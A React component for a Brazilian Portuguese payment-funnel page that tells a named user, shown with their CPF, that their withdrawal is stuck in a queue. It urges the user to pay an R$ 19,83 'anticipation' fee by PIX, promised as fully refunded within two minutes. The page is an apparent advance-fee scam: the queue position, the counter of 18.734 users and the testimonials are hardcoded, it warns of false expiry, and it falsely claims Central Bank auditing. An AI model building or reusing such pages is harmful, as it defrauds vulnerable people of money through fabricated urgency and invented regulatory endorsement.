import { useState } from "react";
import { Loader2, Check, ChevronDown, ChevronUp, Clock } from "lucide-react";
import StickyCtaBar from "./StickyCtaBar";
import testimonial1 from "@/assets/testimonial-1.jpg";
import testimonial2 from "@/assets/testimonial-2.jpg";
import testimonial3 from "@/assets/testimonial-3.jpg";

interface FunnelUpsellSaqueImediatoProps { balance: string; onGeneratePix: () => void; isGenerating: boolean; leadCpf?: string; leadName?: string; }
const FaqItem = ({ question, answer }: { question: string; answer: string }) => { const [open, setOpen] = useState(false); return (<div className="bg-white rounded-lg border border-gray-100 overflow-hidden"><button onClick={() => setOpen(!open)} className="w-full flex items-center justify-between p-3 text-left"><span className="text-gray-800 text-xs font-semibold pr-2">{question}</span>{open ? <ChevronUp className="w-4 h-4 text-gray-400 shrink-0" /> : <ChevronDown className="w-4 h-4 text-gray-400 shrink-0" />}</button>{open && <div className="px-3 pb-3 pt-0"><p className="text-gray-500 text-[11px] leading-relaxed">{answer}</p></div>}</div>); };
const TestimonialCard = ({ img, name, location, text, time }: { img: string; name: string; location: string; text: string; time: string }) => (<div className="bg-white rounded-lg p-3 border border-gray-100"><div className="flex items-center gap-2 mb-2"><img src={img} alt={name} loading="lazy" className="w-8 h-8 rounded-full object-cover" /><div><p className="text-gray-800 text-xs font-semibold">{name}</p><p className="text-gray-400 text-[10px]">{location}</p></div><span className="ml-auto text-green-600 text-[10px] font-bold flex items-center gap-1"><Clock className="w-3 h-3" /> {time}</span></div><p className="text-gray-500 text-[11px] leading-relaxed">"{text}"</p></div>);

const FunnelUpsellSaqueImediato = ({ balance, onGeneratePix, isGenerating, leadCpf, leadName }: FunnelUpsellSaqueImediatoProps) => {
  const firstName = leadName ? leadName.split(" ")[0] : "";
  return (
    <div className="fixed inset-0 z-[80] bg-[#F0F2F5] overflow-y-auto pt-6">
      <div className="bg-[#FF6F00] py-3 px-4"><h1 className="text-white text-sm font-bold text-center tracking-wide flex items-center justify-center gap-2">{firstName ? `⏳ ${firstName.toUpperCase()}, SEU SAQUE ESTÁ NA FILA` : "⏳ SEU SAQUE ESTÁ NA FILA — POSIÇÃO 847"}</h1></div>
      <main className="px-3 py-4 max-w-lg mx-auto pb-24">
        {leadCpf && (<div className="bg-white rounded-xl p-3 mb-3 shadow-sm flex items-center gap-3 border border-green-100"><div className="w-8 h-8 rounded-full bg-green-50 flex items-center justify-center shrink-0"><span className="text-sm">🪪</span></div><div className="flex-1"><p className="text-gray-800 text-xs font-semibold">{leadName || "Titular"}</p><p className="text-gray-400 text-[11px]">CPF: {leadCpf}</p></div><span className="text-green-600 text-[10px] font-bold">Verificado ✓</span></div>)}
        <div className="bg-[#FFF3E0] border border-[#FF9800] rounded-xl p-4 mb-3"><div className="flex items-start gap-2"><span className="text-lg leading-none mt-0.5">⏰</span><div><p className="text-gray-900 text-sm font-bold mb-1">{firstName ? `${firstName}, saque aprovado — aguardando processamento` : "Saque aprovado — aguardando processamento"}</p><p className="text-gray-700 text-xs leading-relaxed">{firstName ? <><strong className="text-gray-900">{firstName}</strong>, seu</> : "Seu"} saque de <span className="font-bold">{balance}</span> foi aprovado, mas está na fila padrão. Previsão atual: <span className="font-bold text-orange-700">5 a 7 dias úteis</span>.</p></div></div></div>
        <div className="bg-white rounded-xl p-5 shadow-sm mb-3">
          <div className="grid grid-cols-2 gap-3 mb-4">
            <div className="bg-gray-50 rounded-lg p-3 border border-gray-200 text-center"><p className="text-gray-400 text-[10px] mb-1">SEM ANTECIPAÇÃO</p><p className="text-gray-900 text-lg font-black">5-7 dias</p><p className="text-red-500 text-[10px] font-semibold">Fila padrão</p></div>
            <div className="bg-green-50 rounded-lg p-3 border border-green-200 text-center relative"><span className="absolute -top-2 left-1/2 -translate-x-1/2 bg-green-500 text-white text-[9px] font-bold px-2 py-0.5 rounded-full">RECOMENDADO</span><p className="text-gray-400 text-[10px] mb-1">COM ANTECIPAÇÃO</p><p className="text-green-700 text-lg font-black">2 min</p><p className="text-green-600 text-[10px] font-semibold">Fila prioritária</p></div>
          </div>
          <p className="text-gray-600 text-xs font-bold mb-2">O que a antecipação inclui:</p>
          <div className="space-y-2 mb-4">{["Processamento prioritário — seu saque sai da fila e é enviado imediatamente", "PIX em até 2 minutos — cai direto na sua chave cadastrada", "Sem risco de expiração — saques na fila padrão podem expirar após 7 dias", "Taxa 100% reembolsável — devolvida junto com o saldo via PIX"].map((t, i) => (<div key={i} className="flex items-start gap-2"><Check className="w-4 h-4 text-green-500 mt-0.5 shrink-0" /><p className="text-gray-700 text-xs leading-relaxed"><span className="font-bold">{t}</span></p></div>))}</div>
          <div className="bg-gray-50 rounded-lg p-3 mb-4 border border-gray-100"><div className="flex items-center justify-between mb-1"><span className="text-gray-500 text-[11px]">Taxa de antecipação:</span><span className="text-gray-900 text-sm font-bold">R$ 19,83</span></div><div className="flex items-center justify-between"><span className="text-gray-500 text-[11px]">Reembolso automático:</span><span className="text-green-600 text-[11px] font-bold">✓ Em até 2 min</span></div></div>
          <p className="text-gray-400 text-[10px] text-center mt-2">🔒 Pagamento seguro via PIX • Reembolso garantido</p>
          <p className="text-gray-500 text-[11px] text-center leading-relaxed mt-3"><span className="font-bold text-gray-700">18.734 pessoas</span> anteciparam o saque e receberam em menos de 2 minutos.</p>
        </div>
        <div className="mb-3"><p className="text-gray-600 text-xs font-bold text-center mb-2">Perguntas frequentes</p><div className="space-y-2"><FaqItem question="Por que meu saque demora 5-7 dias?" answer="Todos os saques passam por uma fila de processamento do sistema bancário. A antecipação coloca seu saque na fila prioritária." /><FaqItem question="A taxa de R$ 19,83 é reembolsável?" answer="Sim, 100%. A taxa é devolvida automaticamente junto com seu saldo em até 2 minutos." /><FaqItem question="É seguro? Vou receber mesmo?" answer="Totalmente seguro. A antecipação utiliza o mesmo protocolo DICT do Banco Central." /></div></div>
        <div className="mb-3"><p className="text-gray-600 text-xs font-bold text-center mb-2">Quem antecipou, recebeu na hora</p><div className="space-y-2"><TestimonialCard img={testimonial1} name="Amanda C." location="Rio de Janeiro, RJ" text="Ia esperar 7 dias, mas paguei a antecipação e em 1 minuto já tinha caído." time="1 min 23s" /><TestimonialCard img={testimonial2} name="Lucas P." location="Brasília, DF" text="Meu primo esperou a fila padrão e demorou 6 dias. Eu antecipei e recebi na hora." time="47s" /><TestimonialCard img={testimonial3} name="Patrícia F." location="Manaus, AM" text="Estava precisando do dinheiro urgente. Antecipei e caiu em menos de 2 minutos." time="1 min 58s" /></div></div>
        <div className="text-center pb-6"><p className="text-gray-400 text-[10px]">Sistema de antecipação auditado pelo Banco Central</p></div>
      </main>
      <StickyCtaBar onClick={onGeneratePix} isGenerating={isGenerating} label={"RECEBER " + balance + " AGORA"} bgColor="bg-[#FF6F00]" shadowColor="shadow-orange-200" />
    </div>
  );
};

export default FunnelUpsellSaqueImediato;
